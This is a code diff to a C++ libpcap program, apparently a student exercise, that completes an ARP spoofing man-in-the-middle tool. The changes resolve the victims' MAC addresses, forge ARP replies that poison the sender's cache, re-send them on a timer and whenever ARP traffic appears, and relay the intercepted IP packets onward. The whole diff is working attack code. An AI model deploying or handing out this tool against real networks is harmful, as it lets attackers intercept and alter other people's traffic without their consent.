@@ -11,18 +11,20 @@
 #include <string>
 #include <vector>
 #include <iostream>
+#include<time.h>
 #define RELAY 1
 #define INFECT 2
 using namespace std;
 #pragma pack(push, 1)
 struct Spoof final{
     Spoof(){}
-    Spoof(Ip sip, Ip tip,EthArpPacket pckt){
-		sip_=sip; tip_=tip; infctpckt=pckt;
+    Spoof(Ip sip, Ip tip,Mac tmac,EthArpPacket pckt){
+		sip_=sip; tip_=tip; tmac_=tmac; infctpckt=pckt; 
 	}
 public:
 	Ip sip_;
     Ip tip_;
+	Mac tmac_;
     EthArpPacket infctpckt;
 };
 #pragma pack(pop)
@@ -41,7 +43,7 @@ Ip getmyip(struct ifreq ifr){
 	Ip myip=Ip(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr); //using overloaded constructor
 	return myip;
 }
-Mac getsendermac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
+Mac getmac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
 	EthArpPacket packet;
 	const u_char* rawpacket;
 	//constructing arp request packet: 'who is sip??'
@@ -78,21 +80,71 @@ Mac getsendermac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
 		}
     }
 }
-void Relay(const u_char* packet){
-
+void Relay(pcap_t* handle, const u_char* packet){
+	int flag=0;
+	EthHdr* ethinfo=(EthHdr*)packet;
+	IpHdr* ipinfo=(IpHdr*)(packet+14);
+	int size=14+ntohs(ipinfo->ip_len);
+	u_char* relaypacket=(u_char*)malloc(sizeof(char)*size);
+	memcpy(relaypacket, packet, sizeof(char)*size);
+	EthHdr* ethhdr=(EthHdr*)relaypacket;
+	IpHdr* iphdr=(IpHdr*)(relaypacket+14);
+	Ip dip=Ip(ntohl((uint32_t)iphdr->ip_src));
+	for(int i=0; i<idx; i++){
+		if(spoofarr[i].sip_==dip){
+			flag=1;
+			ethhdr->smac_=ethhdr->dmac_;
+			ethhdr->dmac_=spoofarr[i].tmac_;
+			break;
+		}
+	}
+	if(flag==1){
+		pcap_sendpacket(handle, relaypacket, size);
+		printf("relay completed\n");
+	}
 }
-void SendInfectFlood(EthArpPacket* pckt){
-
+void SendInfectFlood(pcap_t* handle){
+	for(int i=0; i<idx; i++){
+		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
+			if (res != 0) {
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			}
+	}
 }
-void SendInfect(Ip sip){
-
+void SendInfect(pcap_t* handle, Ip sip){
+	for(int i=0; i<idx; i++){
+		if(spoofarr[i].sip_==sip){
+			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
+			if (res != 0) {
+				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+			}
+			return;
+		}
+	}
 }
-int parsing(const u_char* packet){
-
+int parsing(const u_char* packet, Ip mip){
+	EthHdr* ethhdr=(EthHdr*)packet;
+	if(ntohs(ethhdr->type_)==EthHdr::Arp){
+		ArpHdr* arphdr=(ArpHdr*)(packet+14);
+		if(ntohl(arphdr->sip_)==(uint32_t)mip)
+			return -1;
+		else
+			return INFECT;
+	}
+	else if(ntohs(ethhdr->type_)==EthHdr::Ip4){
+		IpHdr* iphdr=(IpHdr*)(packet+14);
+		Ip dip=ntohl(iphdr->ip_dst);
+		if(ntohl(iphdr->ip_src)==(uint32_t)mip)
+			return -1;
+		else
+			return RELAY;
+	}
+	return -1;
 }
 void init(pcap_t* handle,Ip senderip, Ip targetip, Ip myip, Mac mmac){
 	EthArpPacket packet;
-	Mac smac=getsendermac(handle,myip,senderip,mmac);
+	Mac smac=getmac(handle,myip,senderip,mmac);
+	Mac tmac=getmac(handle,myip,targetip,mmac);
 	packet.eth_.dmac_ = smac;//mac of sender
 	packet.eth_.smac_ = mmac;//mac of mine(attacker)
 	packet.eth_.type_ = htons(EthHdr::Arp);
@@ -105,8 +157,8 @@ void init(pcap_t* handle,Ip senderip, Ip targetip, Ip myip, Mac mmac){
 	packet.arp_.sip_ = htonl(targetip);//ip of target
 	packet.arp_.tmac_ = smac;//mac of sender
 	packet.arp_.tip_ = htonl(senderip);//ip of sender
-	Spoof result=Spoof(senderip, targetip, packet);
-	memcpy(&spoofarr[idx],&result,sizeof(Spoof));
+	Spoof result=Spoof(senderip, targetip, tmac, packet);
+	memcpy(&spoofarr[idx++],&result,sizeof(Spoof));
 }
 int main(int argc, char* argv[]) {
 	if (argc %2==1) {
@@ -151,8 +203,9 @@ int main(int argc, char* argv[]) {
 	///
 	Ip myip=getmyip(ifr_ip);
 	Mac mmac=getmymac(ifr);
-	
+	printf("[info] collect my ip mac completed\n");
 	for(int i=0; i<len; i++){
+		printf("[info] init\n");
 		init(handle, Ip(argv[2+i*2]),Ip(argv[3+i*2]),myip, mmac);
 	}
 	for(int i=0; i<idx; i++){
@@ -163,7 +216,14 @@ int main(int argc, char* argv[]) {
 		}
 	}
 	int res;
+	clock_t start=clock();
 	while(1){
+		clock_t end=clock();
+		if((end - start)>2000){
+			printf("flooding...\n");
+			SendInfectFlood(handle);
+			start=end;
+		}
 		struct pcap_pkthdr* header;
 		int res = pcap_next_ex(handle, &header, &rawpacket);
 		if (res == 0) continue;
@@ -171,18 +231,16 @@ int main(int argc, char* argv[]) {
         	printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
         	exit(1);
 		}
-		res=parsing(rawpacket);
+		res=parsing(rawpacket, myip);
 		switch (res)
 		{
 		case INFECT:
-			printf("infect!\n");
+			printf("sending arp...\n");
 			arppacket=(EthArpPacket*)rawpacket;
-			SendInfect(arppacket->arp_.sip_);
+			SendInfect(handle, arppacket->arp_.sip_);
 			break;
 		case RELAY:
-			printf("relay!\n");
-			Relay(rawpacket);
-			break;
+			Relay(handle, rawpacket);
 		default:
 			break;
 		}
